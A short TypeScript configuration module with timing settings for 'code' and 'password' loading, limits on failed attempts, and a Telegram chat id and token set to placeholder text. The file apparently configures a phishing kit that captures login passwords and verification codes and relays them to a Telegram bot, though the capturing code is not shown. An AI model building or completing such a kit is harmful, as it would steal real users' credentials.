interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    data_chatid: string;
    data_token: string;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 16000,
    max_failed_code_attempts: 3,
    max_failed_password_attempts: 1,
    password_loading_time: 15000,
  },
  telegram: {
    data_chatid: "Voi Về Bản",
    data_token: "Voi Về Bản",
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
